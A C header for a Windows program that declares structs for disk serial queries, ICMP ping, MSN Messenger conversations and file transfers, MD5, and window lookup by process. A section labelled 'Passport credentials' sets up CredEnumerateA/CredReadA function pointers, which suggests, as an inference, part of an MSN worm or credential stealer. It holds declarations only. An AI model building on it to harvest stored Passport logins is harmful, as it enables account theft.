#define REQ_DATASIZE        32

#include <windows.h>
#include "TCPSocket.h"

#pragma once

/* ############################ [ DEVICE STRUCTURES - STORAGE_BUS TYPE, STORAGE_DEVICE_DESCRIPTOR, STORAGE_QUERY_TYPE, STORAGE_PROPERTY_ID, STORAGE_PROPERTY_QUERY ] ############################ */

typedef enum _STORAGE_BUS_TYPE {
   BusTypeUnknown = 0x00,
   BusTypeScsi,
   BusTypeAtapi,
   BusTypeAta,
   BusType1394,
   BusTypeSsa,
   BusTypeFibre,
   BusTypeUsb,
   BusTypeRAID,
   BusTypeMaxReserved = 0x7F
} STORAGE_BUS_TYPE, *PSTORAGE_BUS_TYPE;
           
typedef struct _STORAGE_DEVICE_DESCRIPTOR {
   ULONG  Version;
   ULONG  Size;
   UCHAR  DeviceType;
   UCHAR  DeviceTypeModifier;
   BOOLEAN  RemovableMedia;
   BOOLEAN  CommandQueueing;
   ULONG  VendorIdOffset;
   ULONG  ProductIdOffset;
   ULONG  ProductRevisionOffset;
   ULONG  SerialNumberOffset;
   STORAGE_BUS_TYPE  BusType;
   ULONG  RawPropertiesLength;
   UCHAR  RawDeviceProperties[1];
} STORAGE_DEVICE_DESCRIPTOR, *PSTORAGE_DEVICE_DESCRIPTOR;
      
typedef enum _STORAGE_QUERY_TYPE {
   PropertyStandardQuery = 0,
   PropertyExistsQuery,
   PropertyMaskQuery,
   PropertyQueryMaxDefined
} STORAGE_QUERY_TYPE, *PSTORAGE_QUERY_TYPE;
    
typedef enum _STORAGE_PROPERTY_ID {
   StorageDeviceProperty = 0,
   StorageAdapterProperty,
   StorageDeviceIdProperty
} STORAGE_PROPERTY_ID, *PSTORAGE_PROPERTY_ID;
    
typedef struct _STORAGE_PROPERTY_QUERY {
   STORAGE_PROPERTY_ID  PropertyId;
   STORAGE_QUERY_TYPE  QueryType;
   UCHAR  AdditionalParameters[1];
} STORAGE_PROPERTY_QUERY, *PSTORAGE_PROPERTY_QUERY;
      

/* ############################ [ TCP/IP STRUCTURES - tagICMPHDR, tagECHOREQUEST, tagIPHDR, tagECHOREPLY ] ############################ */
                       
/* ICMP Header - RFC 792 - tagICMPHDR */

typedef struct tagICMPHDR {
   u_char  Type;		// Type
   u_char  Code;		// Code
   u_short Checksum;	// Checksum
   u_short ID;			// Identification
   u_short Seq;			// Sequence
   char    Data;		// Data
} ICMPHDR, *PICMPHDR;
    
/* ICMP Echo Request - tagECHOREQUEST, tagIPHDR */
typedef struct tagECHOREQUEST {
   ICMPHDR icmpHdr;
   DWORD   dwTime;
   char    cData[REQ_DATASIZE];
} ECHOREQUEST, *PECHOREQUEST;

typedef struct tagIPHDR {
   u_char  VIHL;			 // Version and IHL
   u_char	 TOS;			 // Type Of Service
   short	 TotLen;		 // Total Length
   short	 ID;			 // Identification
   short	 FlagOff;		 // Flags and Fragment Offset
   u_char	 TTL;			 // Time To Live
   u_char	 Protocol;		 // Protocol
   u_short Checksum;		 // Checksum
   struct	 in_addr iaSrc;	 // Internet Address - Source
   struct	 in_addr iaDst;	 // Internet Address - Destination
} IPHDR, *PIPHDR;

/* ICMP Echo Reply - tagECHOREPLY */
typedef struct tagECHOREPLY {
   IPHDR       ipHdr;
   ECHOREQUEST echoRequest;
   char        cFiller[256];
} ECHOREPLY, *PECHOREPLY;


/* ############################ [ MSN CONTACT STRUCTURES - MSNContact, MSNContactOnLine, MSNConversation, MSNFileInfo ] ############################ */

typedef struct _MSNContact {
   char * nickname;
   char * email;
} MSNContact, *PMSNContact;

typedef struct _MSNContactOnLine {
   char * nickname;
   char * email;
   char * state;
} MSNContactOnLine, *PMSNContactOnLine;

typedef struct _MSNConversation {
   char * IDConversation;
   char * serverHost;
   char * serverPort;
   TCPSocket * connection;
   char ** contactList;  
   unsigned long numContacts;
} MSNConversation, *PMSNConversation;

typedef struct _MSNFileInfo {
   char * IDConversation;
   char * filename;
   char * filePath;
   char * fileSize;
   char * cookie;
   TCPSocket * connection;
   void * MSNApp;
} MSNFileInfo, *PMSNFileInfo;


/* ################################### [ MD5 CONTEXT - MD5_CTX ] ################################### */

typedef struct {
	unsigned long int state[4];   	      /* state (ABCD) */
	unsigned long int count[2]; 	      /* number of bits, modulo 2^64 (lsb first) */
	unsigned char buffer[64];	          /* input buffer */
} MD5_CTX;


/* ################################### [ WINDOW HANDLER STRUCTURE - HandleWindowByProcessID ] ################################### */

typedef struct _HandleWindowByProcessID {
   unsigned long processID;
   HWND windowHandle;
   bool findHandle;
} HandleWindowByProcessID, *PHandleWindowByProcessID;


/* ##################################### [ PASSPORT CREDENTIALS - CREDENTIAL_ATTRIBUTEA ] ####################################### */

typedef struct _CREDENTIAL_ATTRIBUTEA {
   LPSTR Keyword;
   DWORD Flags;
   DWORD ValueSize;
   LPBYTE Value;
}
CREDENTIAL_ATTRIBUTEA,*PCREDENTIAL_ATTRIBUTEA;

typedef struct _CREDENTIALA {
   DWORD Flags;
   DWORD Type;
   LPSTR TargetName;
   LPSTR Comment;
   FILETIME LastWritten;
   DWORD CredentialBlobSize;
   LPBYTE CredentialBlob;
   DWORD Persist;
   DWORD AttributeCount;
   PCREDENTIAL_ATTRIBUTEA Attributes;
   LPSTR TargetAlias;
   LPSTR UserName;
} CREDENTIALA,*PCREDENTIALA;

typedef CREDENTIALA CREDENTIAL;
typedef PCREDENTIALA PCREDENTIAL;

typedef BOOL (WINAPI *typeCredEnumerateA)(LPCTSTR, DWORD, DWORD *, PCREDENTIALA **);
typedef BOOL (WINAPI *typeCredReadA)(LPCTSTR, DWORD, DWORD, PCREDENTIALA *);
typedef VOID (WINAPI *typeCredFree)(PVOID);
